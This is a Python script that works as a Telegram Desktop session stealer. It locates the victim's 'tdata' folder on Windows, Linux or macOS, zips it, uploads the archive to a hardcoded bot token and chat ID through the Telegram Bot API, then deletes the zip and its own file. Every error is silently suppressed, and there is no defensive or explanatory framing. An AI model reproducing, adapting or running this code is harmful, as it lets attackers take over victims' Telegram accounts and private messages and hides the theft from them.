import os
import sys
import platform
import zipfile
import requests
import tempfile

TOKEN = "7907112586:AAG3MlI_1cg7NllgM1glqq9iQqgboboSAMM"
CHAT_ID = "7984884145"

def get_tdata_path():
    system = platform.system()
    try:
        if system == "Windows":
            return os.path.join(os.getenv("APPDATA"), "Telegram Desktop", "tdata")
        elif system == "Linux":
            return os.path.expanduser("~/.local/share/TelegramDesktop/tdata")
        elif system == "Darwin":
            return os.path.expanduser("~/Library/Application Support/Telegram/tdummy/tdata")
        return None
    except:
        return None

def create_zip(source, destination):
    try:
        with zipfile.ZipFile(destination, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, dirs, files in os.walk(source):
                for file in files:
                    file_path = os.path.join(root, file)
                    zipf.write(file_path, os.path.relpath(file_path, source))
        return True
    except:
        return False

def send_to_telegram(file_path):
    try:
        with open(file_path, 'rb') as f:
            requests.post(
                f"https://api.telegram.org/bot{TOKEN}/sendDocument",
                files={'document': f},
                data={'chat_id': CHAT_ID},
                timeout=30
            )
        return True
    except:
        return False

def cleanup(file_path):
    try:
        if os.path.exists(file_path):
            os.remove(file_path)
    except:
        pass

def main():
    try:
        tdata_path = get_tdata_path()
        if not tdata_path or not os.path.exists(tdata_path):
            return

        temp_dir = tempfile.gettempdir()
        zip_file = os.path.join(temp_dir, "tdata_temp.zip")

        if create_zip(tdata_path, zip_file):
            if send_to_telegram(zip_file):
                cleanup(zip_file)
                
        # O'zini o'chirish
        if platform.system() == "Windows":
            os.system(f"del /f {sys.argv[0]}")
        else:
            os.remove(__file__)
            
    except:
        pass

if __name__ == "__main__":
    main()
